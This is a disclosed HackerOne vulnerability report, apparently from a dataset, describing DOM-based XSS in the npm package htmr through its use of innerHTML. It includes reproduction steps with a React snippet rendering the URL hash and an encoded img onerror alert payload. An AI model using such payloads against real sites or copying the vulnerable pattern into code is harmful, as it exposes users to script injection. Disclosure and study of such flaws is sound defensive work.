---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '753971'
original_report_id: '753971'
title: '[htmr] DOM-based XSS'
weakness: Cross-site Scripting (XSS) - DOM
team_handle: nodejs-ecosystem
created_at: '2019-12-08T13:23:59.024Z'
disclosed_at: '2020-03-15T08:10:39.848Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 12
asset_identifier: Other module
asset_type: SOURCE_CODE
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-dom
---

# [htmr] DOM-based XSS

## Metadata

- HackerOne Report ID: 753971
- Weakness: Cross-site Scripting (XSS) - DOM
- Program: nodejs-ecosystem
- Disclosed At: 2020-03-15T08:10:39.848Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hi,

I would like to report DOM-based XSS in htmr.
It allows attackers to insert malicious JavaScript payload into the page.

# Module

**module name:** htmr
**version:** 0.8.6
**npm page:** `https://www.npmjs.com/package/htmr`

## Module Description

Simple and lightweight (< 2kB) HTML string to react element conversion library

## Module Stats

[6,877] weekly downloads

# Vulnerability

## Vulnerability Description

This module uses `innerHTML` [ref](https://github.com/pveyes/htmr/blob/6e3607a2186d6166eaf395e5272cb9a80c4e2cf6/src/browser.ts#L21) to unescape HTML entities. This leads to DOM-based XSS by inserting HTML-encoded XSS payload (see PoC).

## Steps To Reproduce:

1. Create a React app: `create-react-app xss-htmr`
2. Install `htmr` module: `cd xss-htmr; npm i htmr`
3. Edit `src/App.js` file to this:

```
import React from 'react';
import convert from 'htmr';

export default function App() {
  return convert(`<p>Hash: ${window.location.hash}</p>`);
}
```
4. Run the server: `npm run start`
5. Visit `http://localhost:3000/#&lt;img/src/onerror=alert('xss')&gt;`, an alert will popup.

{F653977}

## Supporting Material/References:

- macOS Mojave 10.14.6
- Node 12.13.1
- NPM 6.12.1
- Chrome 78.0.3904.108

# Wrap up

- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N] 

Thank you and regards,
Visat

## Impact

DOM-based XSS

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
